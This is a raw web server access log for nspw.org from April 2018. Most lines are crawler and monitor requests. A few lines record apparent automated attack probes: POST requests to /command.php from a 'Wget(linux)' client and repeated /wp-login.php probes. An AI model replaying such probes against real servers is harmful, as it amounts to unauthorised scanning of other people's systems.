www.nspw.org:80 186.220.243.170 - - [26/Apr/2018:10:04:57 -0400] "POST /command.php HTTP/1.1" 302 497 "-" "Wget(linux)"
www.nspw.org:80 189.122.225.78 - - [26/Apr/2018:10:04:57 -0400] "POST /command.php HTTP/1.1" 302 497 "-" "Wget(linux)"
www.nspw.org:80 123.125.71.21 - - [26/Apr/2018:10:05:10 -0400] "GET /1999/ HTTP/1.1" 302 502 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
www.nspw.org:80 92.86.156.83 - - [26/Apr/2018:10:05:42 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 92.86.156.83 - - [26/Apr/2018:10:05:43 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 5.255.250.133 - - [26/Apr/2018:10:05:47 -0400] "GET /2009/proceedings/1994/?C=S;O=A HTTP/1.1" 302 589 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
www.nspw.org:80 66.249.73.78 - - [26/Apr/2018:10:06:06 -0400] "GET /cfp/nspw2012-cfp.pdf HTTP/1.1" 302 569 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 183.82.18.67 - - [26/Apr/2018:10:06:10 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 183.82.18.67 - - [26/Apr/2018:10:06:15 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 100.43.85.163 - - [26/Apr/2018:10:07:09 -0400] "GET /2009/proceedings/1996/?C=S;O=A HTTP/1.1" 302 589 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
www.nspw.org:80 175.139.85.73 - - [26/Apr/2018:10:07:16 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 175.139.85.73 - - [26/Apr/2018:10:07:17 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 69.162.124.227 - - [26/Apr/2018:10:07:19 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 207.46.13.90 - - [26/Apr/2018:10:07:47 -0400] "GET /robots.txt HTTP/1.1" 302 545 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 77.88.47.39 - - [26/Apr/2018:10:08:36 -0400] "GET /2005/cfp/latex/Makefile HTTP/1.1" 302 575 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
www.nspw.org:80 23.229.43.158 - - [26/Apr/2018:10:09:32 -0400] "GET /papers/1999/nspw1999-henning.pdf HTTP/1.1" 302 593 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
